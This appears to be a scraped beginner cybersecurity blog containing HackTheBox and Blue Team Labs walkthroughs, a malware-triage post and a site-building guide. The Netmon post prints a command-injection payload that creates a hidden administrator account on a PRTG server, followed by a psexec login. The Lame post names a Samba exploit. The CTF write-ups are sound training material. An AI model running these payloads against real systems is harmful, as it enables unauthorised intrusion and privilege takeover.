This post is primarily going to be a discussion on SIEM’s in general, and then on what my initial thoughts were on Wazuh. The installation instructions online are excellent, so I’m going to let you all use that instead of me just rewriting them. Please refer to the video if you do get stuck or have questions!\n1 – What is a SIEM? That’s an excellent question. Pronounced like sim, SIEM stands for:\n1 2Security 3 4Incident 5 6Event 7 8Management Essentially these solutions help to detect, analyze, and respond to security threats before they can harm the business/individual. According to What is SIEM? | Microsoft Security these solutions, “combine both security information management (SIM) and security event management (SEM) into one security management system.” Here is a list of the “TOP 11” best SIEM’s for 2022 Top 11 Best SIEM Tools in 2022 (Real-Time Incident Response \u0026amp; Security) (softwaretestinghelp.com).\nOpinion not Fact The above list was created by an author with an opinion and should be taken as such. I just wanted you to have an idea of some enterprise level SIEM’s, and do not endorse that the list above is indeed the top 11 to choose from. Please do your own research before recommending one to your boss or purchasing one for your company.\nWhy Wazuh? I first learned about Wazuh when I attended the ShowME IT Summit on 09/01/2022. I absorbed so much incredible information, but this item really stuck with me. I decided to look into it more and see if it was an item worth exploring.\nWazuh is a free open-source application that can be deployed via the cloud or on a physical device. The free aspect of it was key because I really wasn’t looking to pay. Because I wanted the practice and experience, the on-premises server aspect was very appealing. I grabbed an Ubuntu 22.04 ISO and a copy of my Windows 10 VM. I had to install a couple of different tools and packages for Ubuntu, but I kind of organically was taken to them by the installation process.\nNote If you need installation help, check the video!\n3 – More to Come! There were a ton of cool functionalities in the tool itself. The dashboard was an excellent balance of practical and appealing on the eyes. Each agent’s page will show compliance requirements for different standards, such as NIST or PCI DDS. There is a whole section diving into this machine and the MITRE ATT\u0026amp;CK framework. The security events page logs absolutely everything. All in all, a really cool and interesting SIEM that I am incredibly excited to explore more down the line!\nInstallation Video ","link":"https://jrhacka.github.io/post/wazuh/","section":"post","tags":["Projects","SIEM"],"title":"Hozah for Wazuh"},{"body":"","link":"https://jrhacka.github.io/tags/projects/","section":"tags","tags":null,"title":"Projects"},{"body":"","link":"https://jrhacka.github.io/tags/siem/","section":"tags","tags":null,"title":"SIEM"},{"body":"","link":"https://jrhacka.github.io/tags/ctf_walkthrough/","section":"tags","tags":null,"title":"CTF_Walkthrough"},{"body":"","link":"https://jrhacka.github.io/tags/htb/","section":"tags","tags":null,"title":"HTB"},{"body":"Yes that title was a Pokemon reference, and if you didn't understand it I feel sorry for you. This is my walkthrough of the HTB Netmon box. Enjoy, and find my walkthough below!\nStartup This is an entry level beginner friendly box, so the start is going to be roughly the same. With that being said, the first step that other walkthroughs always skip over is spinning up the box and getting connected. While it is easy once you know how to do it if you don't know how you'll never be able to get started. Feel free to skip to the next section if you already know how to do this.\nHTB has 2 options when it comes to completing their boxes. You can spin up a machine via HTB, or connect your own using OpenVPN. I prefer to connect my because of the customizations and different tools I have on my Kali machine, but if you want here is where to find the HTB Attack Box.\nThe first step if you are connecting via OpenVPN is to first make sure you have OpenVPN installed on your device. Either start typing the command see if it autofill’s, or if using Kali run:\n1sudo apt install openvpn Once you are sure is installed in the same place where you see the attack box you can select OpenVPN. Change the server if desired and then download the file. Find the file location and run the following command:\n1openvpn insert/filepath/here After you have connected, you may have to refresh the page in order for the connect box to turn green and show your HTB IP. After that the last step is to find the Jerry box and start it up. Heads Up That IP in the green box will be the IP you use for yourself during interactions with this box. Do not use your actual IP.\nIntelligence Gathering The first thing I always like to do is run NMap. Here is the NMap scan I ran and a breakdown of the flags I used. NMAP Flags -sT = TCP Connect() Scan\n-sV = OS Version\n-Pn = Scan all ports, and don't ping. (Scans ports no matter what)\n-p- = All ports\n-A = All\n-T3 = Speed level. (Options 1-5 with 1 being slowest and 5 fastest)\n-oA = output namp in the three formats to the specified file path.\n1nmap -sT -sV -Pn -p- -A -T3 tar.get.ip.add -oA /home/kali/HTB/Recording/Netmon/Nmap/nmap 1Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 19:42 EDT 2Nmap scan report for 10.10.10.152 3Host is up (0.038s latency). 4Not shown: 65522 closed tcp ports (conn-refused) 5PORT STATE SERVICE VERSION 621/tcp open ftp Microsoft ftpd 7| ftp-syst: 8|_ SYST: Windows_NT 9| ftp-anon: Anonymous FTP login allowed (FTP code 230) 10| 02-03-19 12:18AM 1024 .rnd 11| 02-25-19 10:15PM \u0026lt;DIR\u0026gt; inetpub 12| 07-16-16 09:18AM \u0026lt;DIR\u0026gt; PerfLogs 13| 02-25-19 10:56PM \u0026lt;DIR\u0026gt; Program Files 14| 02-03-19 12:28AM \u0026lt;DIR\u0026gt; Program Files (x86) 15| 02-03-19 08:08AM \u0026lt;DIR\u0026gt; Users 16|_02-25-19 11:49PM \u0026lt;DIR\u0026gt; Windows 1780/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) 18|_http-trane-info: Problem with XML parsing of /evox/about 19|_http-server-header: PRTG/18.1.37.13946 20| http-title: Welcome | PRTG Network Monitor (NETMON) 21|_Requested resource was /index.htm 22135/tcp open msrpc Microsoft Windows RPC 23139/tcp open netbios-ssn Microsoft Windows netbios-ssn 24445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 255985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 26|_http-server-header: Microsoft-HTTPAPI/2.0 27|_http-title: Not Found 2847001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 29|_http-server-header: Microsoft-HTTPAPI/2.0 30|_http-title: Not Found 3149664/tcp open msrpc Microsoft Windows RPC 3249665/tcp open msrpc Microsoft Windows RPC 3349666/tcp open msrpc Microsoft Windows RPC 3449667/tcp open msrpc Microsoft Windows RPC 3549668/tcp open msrpc Microsoft Windows RPC 3649669/tcp open msrpc Microsoft Windows RPC 37No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). 38TCP/IP fingerprint: 39OS:SCAN(V=7.92%E=4%D=8/29%OT=21%CT=1%CU=38952%PV=Y%DS=2%DC=T%G=Y%TM=630D4F6 40OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS= 41OS:A)OPS(O1=M539NW8ST11%O2=M539NW8ST11%O3=M539NW8NNT11%O4=M539NW8ST11%O5=M5 42OS:39NW8ST11%O6=M539ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200 43OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M539NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S 44OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y% 45OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD= 46OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0% 47OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1( 48OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI= 49OS:N%T=80%CD=Z) 50 51Network Distance: 2 hops 52Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 53 54Host script results: 55| smb2-time: 56| date: 2022-08-29T23:44:30 57|_ start_date: 2022-08-29T23:40:15 58| smb-security-mode: 59| authentication_level: user 60| challenge_response: supported 61|_ message_signing: disabled (dangerous, but default) 62| smb2-security-mode: 63| 3.1.1: 64|_ Message signing enabled but not required 65 66TRACEROUTE (using proto 1/icmp) 67HOP RTT ADDRESS 681 36.15 ms 10.10.14.1 692 36.21 ms 10.10.10.152 70 71OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 72Nmap done: 1 IP address (1 host up) scanned in 110.68 seconds So, we've got one item that really catches my eye in that NMap scan. Our old friend port 21 Anonymous FTP is open and seems like an excellent place to start.\nPort 21 - Anonymous FTP In the NMap scan the first thing that should catch your eye is that port 21 FTP is allowing Anonymous FTP. Anonymous FTP essentially means we can log in without having a username or password. We will connect using the username anonymous with no password.\n1ftp anonymous@tar.get.ip.add Heads Up The username being used is the one before the @ sign.\nOnce in we can begin doing our usual snooping, and unlike the Lame box here we can find a lot of useful stuff. In fact, we can find our first flag in the users.txt file. Now we can't find the root flag, but we can find the items that are going to eventually lead us to the root flag. For now it is time we move out of our anonymous ftp and begin exploring the site itself.\nAccessing the Site Before we can begin exploring the site, we need to successfully login. First thing to always do is check default credentials. After doing some quick Googling you find the username and password. Unfortunately prtgadmin does not work, so on to plan B. There's some tools and ways we could brute force this perhaps, but PRTGNetworkMonitor appears to be a pretty popular software. Being the creative hackers we are let’s see if we can see the configuration files via anonymous ftp. According to https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data we can find the configuration files stored as PRTG Configuration.dat and that seems like a good a place to start as any.\nJumping back into anonymous ftp we are going to head to the directory specified from that site. The directory these files are stored in is Program Data, and at first it doesn't appear because it is hidden. Running the show directory command with an -a will now reveal program data. Navigating through there the config.old/.old.bak/.dat should catch your attention. When you open that up you see in the .old.bak file an admin username and password.\nBUTTTTT it still didn't work. After banging my head on the wall, I realized it was a .old document, and it had a year in it. I changed the year to 2019 and was in. Cash money it's time to explore this site.\nExploring the Site This website has a whole lot going on. More than I care to just snoop into, so let's see if there are any known exploits. Looking up this version of the PRTG Network Monitor I started to get a lot of great information. We get some results about a Metasploit exploit, and some articles about using the notifications to send malicious commands. For the sake of getting better everyday let's see if we can figure out these notifications and do some command injection.\nExploiting the Vulnerability (Command Injection) Another incredible site https://tryhackme.com defines command injection as \u0026quot;the abuse of an application's behavior to execute commands on the operating system, using the same privileges that the application on a device is running with.\u0026quot; The notification portion of this site allows you to do some interesting things, and that is going to be our home as we finish gaining administrator access to this box.\nIn the bar up top select Settings, Account settings, Notifications, and then the plus sign to create a new notification. When creating the notification, we'll just skip most of the stuff at the top and jump straight to the bottom. There we find an option to execute program, and when you turn it on you can type a PowerShell command. We are going to create an admin user via this command to login using impacket-psexec.\n1abc123.txt | net user jrhacka passwd123! /add ; net localgroup administrators jrhacka /add Breaking Down the Command abc123.txt = Random document attempting to open\n| = and do what is after this also\nnet user jrhacka passwd123! /add = creating the user jrhacka with the password passwd123!\n; = seperating the commands\nnet localgroup administrators jrhacka /add = adding jrhacka to the administrators group\nUsing Impacket PsExec First off what is PsExec? According to https://www.lifewire.com/psexec-4587631 \u0026quot;PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials. It’s a bit like a remote access program but instead of controlling the computer with a mouse, commands are sent via Command Prompt.\u0026quot; That sums it up better then I ever could, and we are going to use the kali tool impacket-psexec in order to connect to this machine with the credentials we just created. Here is the syntax when connecting with this tool.\n1impacket-psexec jrhacka:\u0026#39;passwd123!\u0026#39;@tar.get.ip.add After you've connected it's just a matter of snooping around and navigating back to that administrator directory we couldn't get to earlier. In there we find the admin flag and that's all she wrote! I hope you all learned something, enjoyed my writeup, and continue better every day!\n","link":"https://jrhacka.github.io/post/netmon/","section":"post","tags":["HTB","CTF_Walkthrough"],"title":"Who's That Netmon?!?!"},{"body":"","link":"https://jrhacka.github.io/tags/btlo/","section":"tags","tags":null,"title":"BTLO"},{"body":"It was just a matter of time before a marvel reference came in to play... Follow along with me as we dive into a challenge from Blue Team Labs Online. New website and new fun content as we break apart an email from an alien hostage taker!\nStartup This new website is super user friendly. There is both a paid and free version, but as far as I can tell the free version offers ton of content. With that being said, create an account and then navigate to the challenge \u0026quot;The Planet's Prestige\u0026quot; located here:\nLink to Challenge https://blueteamlabs.online/home/challenge/the-planets-prestige-e5beb8e545\nThe challenge description is super fun, and if you want to hear me say CoCanDa like Wakanda go check out the video! The first step is to grab the zip file that is included with the challenge. Get organized and make a BTLO directory and move this zip file to the CoCanDa folder inside of that directory. Go ahead and unzip that file using:\n1unzip filename and lets checkout the 'A Hope to CoCanDa.eml' file we get.\nIntelligence Gathering I left this part here for the sake of the standard format I've been using in my blog post, but there is not a lot of intelligence to gather in this case. You can run file on the 'A Hope to CoCanDa.eml' but really we see that it is a .eml file from the extension on the end. That extension is the electronic mail extension, aka email, so we need to bust that baby open. I could not find a great tool to open it in Kali, but you can run strings on it and get a lot of good info. I do that in the video, but it is just as easy to go straight to throwing it in some eml analyzer. To best follow along here is the one I found and used during this ctf: Link to EML Analyzer https://eml-analyzer.herokuapp.com/\nGo ahead and throw that file in there and click the analyze button, and then before we start dissecting that go ahead and scroll all the way to the bottom, download the attachment, and get it moved to your CoCanDa folder. We'll check it out more later, but for now let's see what answers we are able to find.\nQuestion 1: What is the email service used by the malicious actor? Combing through the results from EML Analyzer we can see that there is a domain in the from address called microapple.com, but that gives us a failed answer. We then see in our security headers section that the authentication results gave us an spf=fail meaning that the IP address is not authorized to send from that domain... and yes I had to research what that meant. FYI Below you will find the steps I took to complete this specific question, but it does not work. I confirmed these steps are correct and am therefore going to share them with you, but if you are following along you will not get the correct answer. I beleive the steps below no longer produce the right answer because this is a retired challenge.\nIf you run nslookup on the IP that will give you the domain emkei.cz and after submitting that to the site we know it is the correct domain.\n1nslookup 93.99.104.210 ANSWER emkei.cz\nQuestion 2: What is the Reply-To email address? This is one of those that you just can't over think. The answer is not the from address like you could assume, but instead it is literally the reply-to address. You can find that in the EML Analyzer right below the other headers section and it is called reply-to. ANSWER negeja3921@pashter.com\nQuestion 3: What is the filetype of the received attachment which helped to continue the investigation? When you look at the attachment you pulled from the EML Analyzer it would appear the answer is .pdf. Things are not as they appear though because when you put that in the site it gives us a wrong answer. Go ahead and just run file on that though, and we quickly see things are not as they appear to be.\n1file PuzzleToCoCanDa.pdf ANSWER negeja3921@pashter.com\nQuestion 4: What is the name of the malicious actor? This one was a little tricky, because the obvious answer was Bill Jobs from the sender address, but that doesn't work. We can see a name in the reply-to email, but it's not the attackers whole name or it needs broken up somehow. Let's unzip that PuzzleToCoCanDa.pdf and check out what is in it. We get three items from the zip file.\n11) Daughters Crown 2 32) Good Job Major 4 53) Money.xls The daughters crown appears to just be photo proof that they do indeed have the princess, and nothing really jumps out. Before we dive to into it, we can check the \u0026quot;Good Job Major\u0026quot; pdf file. When you open this file up in Kali nothing appears obvious at first. Go to file in the top left corner, and then select properties so we can look at the properties of the document. That is where we find the answer to this question as it has an author’s name listed. ANSWER Pestero Negeja\nQuestion 5: What is the location of the attacker in this Universe? There is no other useful information in our EML Analyzer or the PDF properties for this question, so let's check out the Money.xls file before we look more into the \u0026quot;Daughter Crown\u0026quot; file. When your open up that excel document you get two sheets, sheet 1 and sheet3. This may seem odd, but after snooping and looking around I wasn't able to uncover a sheet 2, and you also do not have to in order to find the answer. Sheet 1 gives you a bunch of story content, but go and check out some of the data on sheet 3. If you look around enough in square C4 you will find the following:\n1VGhlIE1hcnRpYW4gQ29sb255LCBCZXNpZGUgSW50ZXJwbGFuZXRhcnkgU3BhY2Vwb3J0Lg== You may recognize this as base64, but I did not. To be quite honest I kind of just assumed it was and got lucky. When you put this in a base64 decoder, like this website https://www.base64decode.org/, you get the correct answer. ANSWER The Martian Colony, Beside Interplanetary Spaceport.\nQuestion 6: What could be the probable C\u0026amp;C domain to control the attacker’s autonomous bots? This one we are going to jump back into or EML Analyzer results. If we submit the reply-to email domain we can confirm that is indeed the answer. ANSWER pashter.com\nWrap Up That's all she wrote! We have completed the challenge and provided the CoCanDians with the information to save the kings daughter. My first experience with BTLO was incredibly fun, and there will certainly be more in the future. I hope you all enjoyed, check out the walkthrough video below, and keep getting better every day!\nWalkthrough Video ","link":"https://jrhacka.github.io/post/cocanda/","section":"post","tags":["BTLO","CTF_Walkthrough"],"title":"CoCanDa Forever"},{"body":"In the spirit of getting better everyday I downloaded some malicious files from the site www.virusshare.com and am going to be spending some time playing around with them. I'll be using my REMNux VM and seeing what all I can figure out. Follow along for some beginner moves and learn with me along the way! Find the walkthrough video below and enjoy.\nStartup First off I am going to be using REMNux, and while there are certainly other options this is the one I'm using for now. Feel free to use whichever you prefer, but to best follow along with me REMNux is going to be what you want to use. I have a tutorial written up for the install, and you can find there here: https://jrhacka.github.io/post/remnux_setup/\nOnce you spin up REMNux go ahead and head to www.virusshare.com. Just an FYI you will have to create an account, but it's a simple process and just use a \u0026quot;throwaway\u0026quot; email in case it does start to spam you with items. It does take a few moments for them to email you your username and password, but once that is done come back and we can pick up where we left off.\nHeads Up I created this account one week plus some before posting this article, and have not noticed anything malicious. Just in case be sure this isn't your main email.\nOnce that is done you can login with your username and password. From there select the option Torrents up at the top of the page. The file I seleted was the item at the top of the list, and called VirusShare_00000.zip and was 13.56GB. If it is not at the top of the list anymore I am so sorry, but the best thing I can think to tell you is find the file with that name. If they changed names... match the sizes...?\nSo once you get that file you're going to want to use qbittorrent, or something like it, in order to get the actual zip file. If you do not have qbittorrent you can install it by running:\n1sudo apt install qbittorrent Once you have that on go ahead and right click the downloade torrent and use open with qbittorrent. Once you have the zip file hop back into the command terminal and run:\n1unzip file/path/here Heads Up The REMNux terminal isn't the greatest. I would be sure and install terminator to make your life a little bit easier.\nOrganization So now you have an absolute ton of greate malicious file examples to dive into. The key in this, and really anything, is going to be reamining organized. I made a new directory called WorkingMalware. In that directory I also created a InProgress and Comp subdirectory. You can name or organize however you want, but just be sure you have an A(file from virusshare)--\u0026gt;B(In progress)--\u0026gt;C(Finished) methodology. That way you can keep track as you work through them. The file I used for this analysis was VirusShare_fff3093fe6a763b588b51479f6f52a24. I copied it from it's place in the virusshare folder to the InProgress directory in a directory titled the date 081022. I am going to use the 081022 folder to store all the data I generate for this malicious file. Now it's time to dive in.\nVirusTotal and Strings So the first thing I'm always going to do is drop the file in www.virustotal.com and see what it gives me. When we drop our file in VirusTotal the site lights up like a Christmas tree. We can now confirm that this file is indeed malicious... lol.\nThe second thing I always do is probably very much up for debate. I learned this from John Hammond, and I do like to at least see what strings and file will tell me.\n1file filename 2strings filename From that we pick up two important things. File tells us that this is a PE32, which is a 32-bit portable executable, and that it is compressed using UPX. We can confirm that by running strings and seeing the UPX0 and UPX1 right at the top. We can decompress the UPX by running the following:\n1upx -d filename -0 newfilename We can run strings on that again and we see a lot of stuff, but my newbness came in to play very quickly.\nIn Conclusion You will certainly see a part two for this down the line. I'm pretty booked up in the next couple weeks, so this is not goodbye but see you later. Myself and VirusShare_fff3093fe6a763b588b51479f6f52a24 will meet again.\nWalkthrough Video ","link":"https://jrhacka.github.io/post/malwareanalysispt1/","section":"post","tags":["Malware Analysis"],"title":"Analyzing the Malware...

JRHacka is the cool hacker name for Jake Rice. I graduated from the University of Missouri in May of 2022 with a major in business, a minor in information technology, and certificates in cybersecurity and sales \u0026amp; customer development. I was president of my fraternity, involved in the MU cybersecurity organization CyberTigers, and part of the Cornell Leadership Program.\nBefore I began my current journey with cybersecurity, I was a business major and believed I wanted to go into sales. My first internship was a sales internship, and between my experience there and with my classes I slowly became aware it wasn’t for me. During my summer internship I began working on a data science Udemy, and after that an ethical hacker course. From there on out it was off to the races.\nEver since that moment I never doubted I had found my passion. I was extremely blessed and stumbled into a technician role with a local MSP upon my return from my internship. While gaining hands on experience there I have continued with rigorous self-education during my own time. Using the knowledge I have I want to help other beginners through various forms of media. Whether it is a video walkthrough of me completing a CTF, or a writeup on a piece of malware. My goal is to help other grow while I grow, and there is a lot of growing left to do.\nFeel free to message me via email, LinkedIn, or Twitter if you ever have any questions. Enjoy the site and best of luck(:\n","link":"https://jrhacka.github.io/about/","section":"","tags":["Bio"],"title":""},{"body":"","link":"https://jrhacka.github.io/categories/about-me/","section":"categories","tags":null,"title":"About Me"},{"body":"","link":"https://jrhacka.github.io/tags/bio/","section":"tags","tags":null,"title":"Bio"},{"body":"","link":"https://jrhacka.github.io/categories/","section":"categories","tags":null,"title":"Categories"},{"body":"","link":"https://jrhacka.github.io/series/creating-a-site/","section":"series","tags":null,"title":"Creating a Site"},{"body":"","link":"https://jrhacka.github.io/tags/hugo/","section":"tags","tags":null,"title":"Hugo"},{"body":"","link":"https://jrhacka.github.io/series/","section":"series","tags":null,"title":"Series"},{"body":"1 - Create a GitHub Repository and Clone it The site I created is a static site via GitHub and uses a Hugo theme. The first step is setting up your GitHub repository. In order to do this, create a free account on https://github.com/. Once you have an account you are going to want to set up two different repositories. We are doing this so one can house content until we push it to the main repository that will host the sites static files.\n1A) Select the plus sign in the top right corner and choose “New Repository” (It may be in a different spot, but should be easy to identify) 2 3B) Name it and describe it as whatever really. I named this one blog-site and put some basic description. 4 5C) Click create repository 6 7D) Repeat this for what will be the site repository. 8 (Note: Name this repository whatever you are going to name the site (enter name here).github.io) 9 10E) You should have 2 repositories that look similar to the below. 11 12F) Clone your blog repository (git clone xxxxx) 2 - Select and Clone your Theme Go to the Hugo site https://themes.gohugo.io/themes and select your theme. I used “Clarity”, but the process will be similar no matter which theme you choose. Once you have the theme you want, hop back over to your machine and we are going to create the appropriate site. Jump into the equivalent of the “Blog-Site” folder we cloned and run the following command to create a new hugo site.\n1hugo new site enternamehere Once that is done hop into that new folder(titled enternamehere) and find the themes directory. Jump into themes and run git clone on the Hugo repository. There is either a command to copy directly from the page or you can select download and copy the GitHub address.\n1git clone https://siteaddress.com/downloadyourtheme Note Depending on your theme it may be a slightly different process.\n3 - Explore your Theme \u0026amp; the Initial Configuration Jump into the themes folder, and then into the named folder that matches your theme (/themes/themename/). Check out the contents of that folder and you should see treasure troves of information. In my experience each theme I have toyed with has an “examplesite” folder with sample files and content to use. Somewhere in that folder find the theme.toml/config.toml. Copy that material and paste it into the config.toml in your site folder.\n1subl /home/kali/yourblogfolder/blogname/config.toml Be sure to change things appropriately, such as baseurl, and language if needed. Also, take some time here and really dig around in the \u0026quot;examplesite\u0026quot; folder. You will find key examples to use for your own content and site customizations.\n4 - \u0026quot;Sync\u0026quot; the Repository with your Machine Run the command Hugo to create the site locally. It will provide you with your local site address. If you don’t like it then delete the contents in the theme folder and go back to step 2 with your new theme. Depending on which theme you chose it may not run locally but go check the documentation and it should give you good instructions on how to get to that point! If it doesn’t that’s your sign to switch themes.\n1hugo server After you have confirmed you like your theme go back to the main directory (../Blog) and now clone your site repository (git clone entername.github.io). Enter that new directory and create something we can use to commit. I created a README.md. Once that is done run the following commands in this order.\nCommands in Order This is a notice that has a lot of various kinds of content in it.\nStage your changes 1git add . Commit your repository 1git commit -m \u0026#34;Enter Commit Text Here\u0026#34; Push the data through the branch 1git push origin main (On doing this for my second theme I did bump into some problems using my “Password” for Github. If you are having those troubles go into developer settings in the general settings in Github and generate a personal access token to use as your password.) After that is done jump back into your blog repository (In my case /home/kali/Blog-Site/jrhacka). Run the command: 1git submodule add –b main (address of the site repository) public This creates a “public” folder that will house content. When in that folder you should see your README.md you created in the beginning of step 4. Generate the static files by running 1hugo -t themename This will place the static files into the public directory. You will need to run that in order to update the actual site. After that hop into the public folder and run steps A, B, and C again. 5 - Change the Style Now this is more just general advice then an actual step by step guide. Refer to the documentation, open a separate command terminal and deploy the site locally, and bounce between the example site and your actual folder changing files. This is the best way I have found to customize the site as each theme is dramatically different in how they are set up. I would be more than happy to help you research if you bump into problems though!\n6 - Upload Content When it comes to uploading content, I recommend doing it this way. Find the example you like in the examplesite/content folder (or if not there refer to your theme documentation), copy it to the appropriate folder (such as Blog/jrhacka/content), and then replace it with your content and changes. I always copy those from the examplesite folder, place them in the matching directory path in my actual directory, and just edit the files. It’s much easier that way and saves you a lot of time and effort.\n7 - Go Live and Enjoy Lastly, navigate to the directory where everything is stored (/home/kali/Blog/xxx) and use hugo –t (theme name). Hop in the updated public folder and then run the git trio (add commit push – or steps A, B, \u0026amp; C from section 4). After that just continue to play with your site, but it should be live and rolling!

This walkthough of the Lame box is another begginner friendly entry level HTB. We'll explore a little anonymous FTP, and find out more about Samba. You can find the walkthrough video down below!\nStartup This is an entry level beginner freindley box, so the walkthrough is going to be the same. With that being said, the first step that other walkthoughs always skip over is spinning up the box and getting connected. While it is easy once you know how to do it if you don't know how you'll never be able to get started. Feel free to skip to the next section if you already know how to do this.\nHTB has 2 options when it comes to completing their boxes. You can spin up a machine via HTB, or connect your own using OpenVPN. I prefer to connect my because of the customizations and different tools I have on my Kali machine, but if you want here is where to find the HTB Attack Box.\nThe first step if you are connecting via OpenVPN is to first make sure you have OpenVPN installed on your device. Either start typing the command see if it autofills, or if using Kali run:\n1sudo apt install openvpn Once you are sure is installed in the same place where you see the attack box you can select OpenVPN. Change the server if desired and then download the file. Find the file location and run the following command:\n1openvpn insert/filepath/here After you have connected you may have to refresh the page in order for the connect box to turn green and show your HTB IP. After that the last step is to find the Jerry box and start it up. Heads Up That IP in the green box will be the IP you use for yourself during interactions with this box. Do not use your actual IP.\nIntelligence Gathering The first thing I always like to do is run NMap. Here is the NMap scan I ran and a breakdown of the flags I used.\n1nmap -sT -sV -Pn -p- -A -T3 tar.get.ip.add -oA /home/kali/HTB/WU/Lame/nmap/scans NMAP Flags -sT = TCP Connect() Scan\n-sV = OS Version\n-Pn = Scan all ports, and don't ping.

(Options 1-5 with 1 being slowest and 5 fastest)\n-oA = output namp in the three formatss to the specified file path.\nWhile that is running let's go ahead and see if we can find anything at the IP. Open up a web browser and put in the target machines IP address. We don't get any results, but we'll check a couple of the usual directories just in case. I searched around using /admin /login /user /signin /contact and got nothing, so lets dive in to those NMap results.\n1Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 22:53 EDT 2Nmap scan report for 10.10.10.3 3Host is up (0.033s latency). 4Not shown: 65530 filtered tcp ports (no-response) 5PORT STATE SERVICE VERSION 621/tcp open ftp vsftpd 2.3.4 7|_ftp-anon: Anonymous FTP login allowed (FTP code 230) 8| ftp-syst: 9| STAT: 10| FTP server status: 11| Connected to 10.10.14.9 12| Logged in as ftp 13| TYPE: ASCII 14| No session bandwidth limit 15| Session timeout in seconds is 300 16| Control connection is plain text 17| Data connections will be plain text 18| vsFTPd 2.3.4 - secure, fast, stable 19|_End of status 2022/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 21| ssh-hostkey: 22| 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) 23|_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 24139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 25445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 263632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) 27Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 28Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%) 29No exact OS matches for host (test conditions non-ideal). 30Network Distance: 2 hops 31Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 32 33Host script results: 34|_smb2-time: Protocol negotiation failed (SMB2) 35| smb-security-mode: 36| account_used: \u0026lt;blank\u0026gt; 37| authentication_level: user 38| challenge_response: supported 39|_ message_signing: disabled (dangerous, but default) 40| smb-os-discovery: 41| OS: Unix (Samba 3.0.20-Debian) 42| Computer name: lame 43| NetBIOS computer name: 44| Domain name: hackthebox.gr 45| FQDN: lame.hackthebox.gr 46|_ System time: 2022-06-04T22:55:49-04:00 47|_clock-skew: mean: 2h00m06s, deviation: 2h49m45s, median: 3s 48 49TRACEROUTE (using proto 1/icmp) 50HOP RTT ADDRESS 511 32.78 ms 10.10.14.1 522 32.81 ms 10.10.10.3 53 54OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 55Nmap done: 1 IP address (1 host up) scanned in 176.96 seconds So we've got two items that really catch my eye in that NMap scan. Item one is the port 21 Anonymous FTP, and item two is the Samba ports 139 and 445. Lets start off by looking into port 21 first.\nPort 21 - Anonymous FTP In the NMap scan the first thing that should catch your eye is that port 21 FTP is allowing Anonymous FTP. Anonymous FTP essentially means we can log in wihout having a username or password. We will connect using the user name anonymous with no password.\n1ftp anonymous@tar.get.ip.add Heads Up The username being used is the one before the @ sign.\nOnce you get in there you can do some snooping, but you're not able to find anything. Just to cover your bases login using ftp as the user too. Unfourtaenly, there is nothing there either. It appears anonymous FTP was a red herring. That's okay though, because we have another open port to check!\nPort 139/445 - Samba First off what is Samba? Port 139 and 445 are SMB and used for file transfer, and back in the day it used to run on top of NetBIOS. Now days port 445 TCP can use it for file transfer. When looking for this specific version you do find that there is an exploit for it. This is the perfect time to introduce searchsploit.\n1searchsploit samba 3.0.2 When doing that we see several exploits, but the one we'll focus on is:\nSearchploit Result Samba 3.0.20 \u0026lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb\nNow that we've found an exploit it's time to... exploit!\nExploiting the Vulnerablity From our searchsploit result we see we can use this exploit via Metasploit. Lets get it spun up and dive in.\n1msfconsole Once you have it started we can get it set up.\nMetasploit Setup 1- Use show options\n2-Set the rhost as the target IP (set rhost tar.get.ip.add)\n3-Set the lhost as your IP (set lhost your.HTB.ip.add)(The IP given to you via HTB (it's in the green 